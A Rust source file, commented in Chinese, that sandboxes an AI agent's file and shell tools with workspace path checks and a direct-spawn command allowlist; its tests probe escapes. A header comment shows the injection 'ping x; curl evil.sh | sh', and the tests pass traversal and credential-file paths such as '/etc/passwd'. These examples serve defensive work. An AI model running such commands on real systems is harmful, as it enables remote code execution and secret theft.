// Agent 基础工具的沙箱
//
// 两条边界：
//   文件 —— 路径必须落在配置的工作区根目录内
//   终端 —— 命令必须在白名单里，且直接 spawn 可执行文件，不经过 shell
//
// 「不经过 shell」是终端这条的关键。只要把整串交给 cmd /C，白名单就是纸糊的：
// 检查第一个词是不是 ping，挡不住 `ping x; curl evil.sh | sh`。要真检查就得
// 自己解析 shell 语法，那是个 bug 农场。直接 spawn 之后元字符没有任何特殊含义。

use std::collections::HashSet;
use std::path::{Component, Path, PathBuf};

use crate::config::AppConfig;

/// 沙箱：工作区根目录 + 终端白名单。每次工具调用现建，换取配置热更新
pub struct Sandbox {
    roots: Vec<PathBuf>,
    allowlist: Vec<String>,
}

impl Sandbox {
    pub fn from_config(config: &AppConfig) -> Self {
        Self {
            roots: normalize_roots(&config.workspace_roots()),
            allowlist: config.tools.shell_allowlist.clone(),
        }
    }

    /// 拒绝一切的空沙箱。拿不到配置时的兜底 —— 失败要往「什么都不许」的方向倒
    pub fn deny_all() -> Self {
        Self {
            roots: Vec::new(),
            allowlist: Vec::new(),
        }
    }

    /// 测试用构造（fs_tools 的测试也要用，故 pub(crate)）
    #[cfg(test)]
    pub(crate) fn with(roots: Vec<PathBuf>, allowlist: Vec<&str>) -> Self {
        Self {
            roots: normalize_roots(&roots),
            allowlist: allowlist.iter().map(|s| s.to_string()).collect(),
        }
    }

    /// 可读的根目录清单，用于拒绝时告诉模型边界在哪
    pub fn roots_hint(&self) -> String {
        if self.roots.is_empty() {
            return "（当前未配置任何工作区，文件操作已全部禁用）".to_string();
        }
        self.roots
            .iter()
            .map(|r| strip_verbatim(r).display().to_string())
            .collect::<Vec<_>>()
            .join("、")
    }

    /// 白名单清单，用于拒绝时告诉模型能用什么
    pub fn allowlist_hint(&self) -> String {
        if self.allowlist.is_empty() {
            return "（当前白名单为空，终端已禁用）".to_string();
        }
        self.allowlist.join("、")
    }

    /// 校验路径并返回可用于实际操作的规范化路径。
    ///
    /// 校验顺序每一步都不能省，理由见各步注释。
    pub fn resolve(&self, raw: &str) -> Result<PathBuf, String> {
        if self.roots.is_empty() {
            return Err("文件操作已被禁用（未配置任何工作区根目录）".to_string());
        }

        let path = Path::new(raw);

        for comp in path.components() {
            match comp {
                // 必须查原始输入而不是拼接后的字符串 —— 拼完再查已经晚了
                Component::ParentDir => {
                    return Err(format!("路径不允许包含 ..（收到 {raw}）"));
                }
                Component::Normal(name) => {
                    let name = name.to_string_lossy();
                    // 挡 NTFS 备用数据流：a.txt:hidden 写进去的内容 read_file
                    // 读不到、资源管理器也看不见，是个天然的藏东西的地方。
                    // 盘符不会走到这里 —— Windows 上 C: 被解析成 Prefix 组件
                    if name.contains(':') {
                        return Err(format!("路径组件不允许包含冒号（收到 {name}）"));
                    }
                }
                _ => {}
            }
        }

        // 保留设备名不是洁癖：write_file("workspace/NUL.txt") 会静默写进空设备，
        // read_file("workspace/CON") 会阻塞等控制台输入，两个都极难排查
        if let Some(name) = path.file_name() {
            let name = name.to_string_lossy();
            if is_reserved_name(&name) {
                return Err(format!("{name} 是系统保留设备名，不能作为文件名"));
            }
        }

        let resolved = canonicalize_deepest(path);
        if self.roots.iter().any(|r| is_within(r, &resolved)) {
            Ok(resolved)
        } else {
            Err(format!(
                "路径 {raw} 不在工作区内。当前允许的目录：{}",
                self.roots_hint()
            ))
        }
    }

    /// 校验命令名并解析出可执行文件的绝对路径
    pub fn resolve_command(&self, command: &str) -> Result<PathBuf, String> {
        if self.allowlist.is_empty() {
            return Err("终端功能已被禁用（命令白名单为空）".to_string());
        }

        let cmd = command.trim();
        if cmd.is_empty() {
            return Err("命令不能为空".to_string());
        }

        // 只接受裸命令名。带路径分隔符意味着可以指向工作区里模型自己写的文件
        if cmd.contains('/') || cmd.contains('\\') || cmd.contains(':') {
            return Err(format!(
                "命令必须是不带路径的名字（收到 {cmd}），可用命令：{}",
                self.allowlist_hint()
            ));
        }
        // 含空格说明模型还在按老形态拼整串。明确引导，比让它对着模糊失败反复重试强
        if cmd.contains(char::is_whitespace) {
            return Err(format!(
                "command 只能是命令名本身，参数请放进 args 数组。\
                 例如 {{\"command\":\"ping\",\"args\":[\"-n\",\"1\",\"127.0.0.1\"]}}（收到 {cmd}）"
            ));
        }

        let key = cmd.to_lowercase();
        let key = key.strip_suffix(".exe").unwrap_or(&key);
        // 白名单侧也做同样的归一化，免得 "Ping.exe" 与 "ping" 被当成两回事
        let allowed = self.allowlist.iter().any(|a| {
            let a = a.trim().to_lowercase();
            a.strip_suffix(".exe").unwrap_or(&a) == key
        });
        if !allowed {
            return Err(format!(
                "命令 {cmd} 不在白名单内。可用命令：{}",
                self.allowlist_hint()
            ));
        }

        resolve_exe(key).ok_or_else(|| {
            format!("找不到可执行文件 {cmd}（脚本包装如 .cmd/.bat 不被支持）")
        })
    }

    /// spawn 子进程的工作目录 = 第一个工作区根
    pub fn work_dir(&self) -> Option<&Path> {
        self.roots.first().map(|p| p.as_path())
    }
}

/// 按白名单条目的写法解析可执行文件，供配置校验用。
///
/// 与 resolve_command 共用同一套归一化与搜索逻辑 —— 校验和实际执行
/// 必须给出一致的答案，否则设置页说「可用」而调用时报「找不到」
pub fn resolve_allowed_command(name: &str) -> Option<PathBuf> {
    let key = name.trim().to_lowercase();
    let key = key.strip_suffix(".exe").unwrap_or(&key);
    if key.is_empty() {
        return None;
    }
    resolve_exe(key)
}

/// 规范化根目录列表：丢掉空串，再逐个 canonicalize。
///
/// 丢空串这步是必须的，不是防御性洁癖：空路径的 components() 也是空的，
/// is_within 会对任何路径返回 true —— 配置里一个 `workspace_roots = [""]`
/// 就等于把沙箱整个关掉，而表面上看起来还配了根目录。
///
/// canonicalize 则是为了让比对双方处在同一形态：大小写、符号链接、
/// 8.3 短名（PROGRA~1）、subst 盘符只要有一边没解析就会漏判
fn normalize_roots(roots: &[PathBuf]) -> Vec<PathBuf> {
    roots
        .iter()
        .filter(|r| !r.as_os_str().is_empty())
        .map(|r| canonicalize_deepest(r))
        .collect()
}

/// Windows 保留设备名判断。忽略扩展名与大小写 —— NUL.txt 同样命中
fn is_reserved_name(name: &str) -> bool {
    let stem = name.split(['.', ':']).next().unwrap_or(name);
    let stem = stem.trim_end_matches([' ', '.']);
    matches!(
        stem.to_ascii_uppercase().as_str(),
        "CON" | "PRN" | "AUX" | "NUL" | "CLOCK$"
        | "COM1" | "COM2" | "COM3" | "COM4" | "COM5"
        | "COM6" | "COM7" | "COM8" | "COM9"
        | "LPT1" | "LPT2" | "LPT3" | "LPT4" | "LPT5"
        | "LPT6" | "LPT7" | "LPT8" | "LPT9"
    )
}

/// 剥掉 Windows canonicalize 产生的 verbatim 前缀。
/// 只要有一边没剥，比对就必然对不上
fn strip_verbatim(p: &Path) -> PathBuf {
    let s = p.to_string_lossy();
    if let Some(rest) = s.strip_prefix(r"\\?\UNC\") {
        return PathBuf::from(format!(r"\\{rest}"));
    }
    if let Some(rest) = s.strip_prefix(r"\\?\") {
        return PathBuf::from(rest);
    }
    p.to_path_buf()
}

/// canonicalize 到最深的存在祖先，再把剩余部分拼回。
///
/// write_file 的目标通常还不存在，直接 canonicalize 会失败。而只要
/// canonicalize 了存在的那段，符号链接、junction、8.3 短名、subst 盘符
/// 就都已经被解析成真实位置 —— 逃逸走不了。
fn canonicalize_deepest(path: &Path) -> PathBuf {
    let mut existing = path.to_path_buf();
    let mut rest: Vec<std::ffi::OsString> = Vec::new();

    loop {
        if let Ok(c) = existing.canonicalize() {
            let mut out = c;
            for part in rest.iter().rev() {
                out.push(part);
            }
            return out;
        }
        match existing.file_name() {
            Some(name) => {
                rest.push(name.to_os_string());
                if !existing.pop() {
                    break;
                }
            }
            None => break,
        }
    }
    // 一路到根都 canonicalize 不了（盘符不存在等），原样返回让后续比对判定失败
    path.to_path_buf()
}

/// 组件级、大小写不敏感的前缀判断。
///
/// 不能用 Path::starts_with —— 它大小写敏感，而 NTFS 不是。
/// 更不能退化成字符串 contains，那样 C:\foo 会被判成 C:\foobar 的前缀。
fn is_within(root: &Path, path: &Path) -> bool {
    let root = strip_verbatim(root);
    let path = strip_verbatim(path);

    let mut pc = path.components();
    for rc in root.components() {
        match pc.next() {
            Some(c) if comp_key(&c) == comp_key(&rc) => {}
            _ => return false,
        }
    }
    true
}

/// 组件的比较键。Prefix（盘符）也要小写化 —— f:\ 与 F:\ 是同一个位置
fn comp_key(c: &Component) -> String {
    match c {
        Component::Prefix(p) => p.as_os_str().to_string_lossy().to_lowercase(),
        Component::RootDir => "/".to_string(),
        Component::CurDir => String::new(),
        Component::ParentDir => "..".to_string(),
        Component::Normal(s) => s.to_string_lossy().to_lowercase(),
    }
}

/// 按系统搜索顺序解析可执行文件的绝对路径。
///
/// 自己解析而不是让 CreateProcess 去搜，有两个不可替代的理由：
///   1. 传绝对路径时 CreateProcess 根本不做搜索，"模型往工作区写个 ping.exe
///      顶替系统命令" 这条路自然消失（它的搜索顺序里当前目录排在 System32 前面）
///   2. 能过滤掉 .bat/.cmd/.ps1 —— 那些会重新进入 shell 解释器，等于绕回原点
///
/// 不引 which crate：它不含 System32、也不替我们过滤 .cmd，补完还不如自己写。
fn resolve_exe(name: &str) -> Option<PathBuf> {
    let mut dirs: Vec<PathBuf> = Vec::new();

    // System32 通常不在 PATH 里，而 where/ping/ipconfig/tasklist 全住在那儿。
    // 只遍历 PATH 的话默认白名单一个都解析不到
    #[cfg(windows)]
    if let Ok(root) = std::env::var("SystemRoot") {
        let root = PathBuf::from(root);
        dirs.push(root.join("System32"));
        dirs.push(root.join("System"));
        dirs.push(root);
    }

    if let Ok(path) = std::env::var("PATH") {
        let sep = if cfg!(windows) { ';' } else { ':' };
        dirs.extend(
            path.split(sep)
                // 空项与 "." 在 cmd 语义里都表示当前目录，必须跳过 ——
                // 否则「不搜索 cwd」这条就从后门漏了
                .filter(|d| !d.is_empty() && *d != "." && *d != ".\\" && *d != "./")
                .map(PathBuf::from),
        );
    }

    // 只认 .exe / .com。.bat / .cmd / .ps1 一律排除 —— 那些是脚本包装，
    // 执行时会重新拉起解释器，等于把刚封掉的 cmd /C 从侧门放回来。
    // 代价是 npm / yarn / conda 这类包装器永远进不了白名单，这是设计目标。
    // 不读 PATHEXT：那是用户可改的环境变量，从它推导「什么算可执行」
    // 等于把边界的定义权交出去
    let exts: Vec<&str> = if cfg!(windows) {
        vec![".exe", ".com"]
    } else {
        vec![""]
    };

    let mut seen = HashSet::new();
    for dir in dirs {
        if !seen.insert(dir.to_string_lossy().to_lowercase()) {
            continue;
        }
        for ext in &exts {
            let candidate = dir.join(format!("{name}{ext}"));
            if candidate.is_file() {
                return Some(candidate);
            }
        }
    }
    None
}

#[cfg(test)]
mod tests {
    use super::*;

    /// 在系统临时目录下建一个真实的工作区（canonicalize 需要路径真实存在）
    fn workspace() -> PathBuf {
        let dir = std::env::temp_dir().join("avalon_sandbox_test/ws");
        std::fs::create_dir_all(&dir).unwrap();
        dir
    }

    fn sb() -> Sandbox {
        Sandbox::with(vec![workspace()], vec!["ping"])
    }

    #[test]
    fn 工作区内的路径放行() {
        let p = workspace().join("a.txt");
        assert!(sb().resolve(p.to_str().unwrap()).is_ok());
    }

    #[test]
    fn 尚不存在的文件也能解析() {
        // write_file 的目标通常不存在，不能因此失败
        let p = workspace().join("还没建的目录/新文件.txt");
        assert!(sb().resolve(p.to_str().unwrap()).is_ok());
    }

    #[test]
    fn 父目录跳转被拒() {
        let p = workspace().join("../../secrets.toml");
        let err = sb().resolve(p.to_str().unwrap()).unwrap_err();
        assert!(err.contains(".."));
    }

    #[test]
    fn 工作区外的绝对路径被拒并给出边界() {
        // 用临时目录的上一层而不是 C:/Windows/... —— 后者在非 Windows 上
        // "C:" 会被当成普通组件，先撞到冒号校验，测的就不是这条了
        let outside = std::env::temp_dir().join("avalon_sandbox_test/机密.toml");
        let err = sb().resolve(outside.to_str().unwrap()).unwrap_err();
        assert!(err.contains("不在工作区内"), "实际: {err}");
        // 拒绝要可诊断：模型得知道边界在哪才能自我纠正
        assert!(err.contains("当前允许的目录"));
    }

    #[test]
    fn 空串根目录不等于放行一切() {
        // 空路径的 components() 也是空的，前缀判断会对任何路径成立。
        // 配置里写 [""] 必须等同于没配，而不是等同于关掉沙箱
        let sb = Sandbox::with(vec![PathBuf::from("")], vec![]);
        assert!(sb.resolve("/etc/passwd").is_err());
    }

    #[test]
    fn 根目录大小写不同也算命中() {
        // NTFS 大小写不敏感，Path::starts_with 却是敏感的
        let upper = workspace().to_string_lossy().to_uppercase();
        let sb = Sandbox::with(vec![PathBuf::from(upper)], vec![]);
        let p = workspace().join("a.txt");
        assert!(sb.resolve(p.to_str().unwrap()).is_ok());
    }

    #[test]
    fn 同名前缀目录不被误判为工作区内() {
        // C:\foo 不该把 C:\foobar 当成自己的子目录
        let sibling = std::env::temp_dir().join("avalon_sandbox_test/ws_evil");
        std::fs::create_dir_all(&sibling).unwrap();
        let p = sibling.join("a.txt");
        assert!(sb().resolve(p.to_str().unwrap()).is_err());
    }

    #[test]
    fn 数据流冒号被拒() {
        let p = workspace().join("a.txt:hidden");
        let err = sb().resolve(p.to_str().unwrap()).unwrap_err();
        assert!(err.contains("冒号"));
    }

    #[test]
    fn 保留设备名被拒且带扩展名也命中() {
        for name in ["NUL", "NUL.txt", "con", "COM1.log"] {
            let p = workspace().join(name);
            let err = sb().resolve(p.to_str().unwrap()).unwrap_err();
            assert!(err.contains("保留设备名"), "{name} 应被拒");
        }
    }

    #[test]
    fn 空工作区等于全部禁止() {
        let sb = Sandbox::with(vec![], vec![]);
        let err = sb.resolve("a.txt").unwrap_err();
        assert!(err.contains("已被禁用"));
    }

    #[test]
    fn 空白名单等于禁用终端() {
        let sb = Sandbox::with(vec![workspace()], vec![]);
        assert!(sb.resolve_command("ping").unwrap_err().contains("已被禁用"));
    }

    #[test]
    fn 白名单外的命令被拒并列出可用命令() {
        let err = sb().resolve_command("del").unwrap_err();
        assert!(err.contains("不在白名单"));
        assert!(err.contains("ping"));
    }

    #[test]
    fn 带路径的命令被拒() {
        for cmd in ["./ping", "C:\\evil\\ping", "sub/ping"] {
            assert!(sb().resolve_command(cmd).is_err(), "{cmd} 应被拒");
        }
    }

    #[test]
    fn 整串命令引导改用args数组() {
        let err = sb().resolve_command("ping -n 1 127.0.0.1").unwrap_err();
        assert!(err.contains("args"));
    }

    #[test]
    fn 白名单命中时解析出绝对路径() {
        // ping 在 Windows 与主流 Linux 上都存在，可作为解析链路的活体验证
        let path = sb().resolve_command("ping").expect("应能解析到 ping");
        assert!(path.is_absolute());
        assert!(path.is_file());
    }

    /// 默认白名单必须真的能解析出来。
    /// where / ipconfig / tasklist / systeminfo 都住在 System32，而 System32
    /// 通常不在 PATH 里 —— 只遍历 PATH 的实现会让默认白名单一个都用不了，
    /// 且表现为「配了却报找不到」，非常难联想到搜索路径上
    #[test]
    fn 默认白名单里的每个命令都能解析到() {
        let defaults = crate::config::ToolsConfig::default().shell_allowlist;
        let missing: Vec<_> = defaults
            .iter()
            .filter(|c| resolve_allowed_command(c).is_none())
            .collect();
        assert!(missing.is_empty(), "默认白名单里这些命令解析不到: {missing:?}");
    }

    #[test]
    fn 大小写与exe后缀都不影响白名单命中() {
        let sb = Sandbox::with(vec![workspace()], vec!["Ping.exe"]);
        assert!(sb.resolve_command("PING").is_ok());
        assert!(sb.resolve_command("ping.exe").is_ok());
    }
}
